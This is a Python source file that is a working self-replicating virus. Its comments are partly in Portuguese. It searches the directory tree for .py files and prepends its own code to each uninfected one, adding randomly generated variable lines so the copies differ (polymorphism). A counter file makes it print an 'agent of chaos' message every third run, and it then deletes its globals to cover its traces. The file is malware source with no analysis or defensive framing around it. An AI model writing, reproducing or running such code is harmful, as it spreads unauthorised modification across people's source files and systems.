# begin-virus

import os
import random
import string

def find_files_to_infect(directory="."):
    python_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".py"):
                python_files.append(os.path.join(root, file))
    return python_files


def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data


def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data


def infect(file, virus_code):
    if data := get_content_if_infectable(file):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)


def get_virus_code():
    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code


def summon_chaos():
    print(
        "Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\n Eu sou o agente do caos! "
    )

# Variável de contagem para controlar as execuções
execution_count_file = "execution_count.txt"

def read_execution_count():
    try:
        with open(execution_count_file, "r") as count_file:
            return int(count_file.read())
    except FileNotFoundError:
        return 0

def write_execution_count(count):
    with open(execution_count_file, "w") as count_file:
        count_file.write(str(count))


def generate_polymorphic_code():
    variables = [ ]

    for _ in range(10):
        variable_name = ''.join(random.choices(string.ascii_letters, k=10))
        variable_value = ''.join(random.choices(string.ascii_letters, k=10))
        variables.append(f'{variable_name} = "{variable_value}"\n')

    return variables


# entry point


try:
    # Incrementa o contador de execuções
    execution_count = read_execution_count() + 1
    write_execution_count(execution_count)

    # retrieve the virus code from the current infected script
    virus_code = get_virus_code()
    virus_code.extend(generate_polymorphic_code())

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    if execution_count % 3 == 0:
        summon_chaos()

# except:
#     pass

finally:

    # delete used names from memory
    for i in list(globals().keys()):
        if i[0] != "_":
            exec("del {}".format(i))

    del i

# end-virus
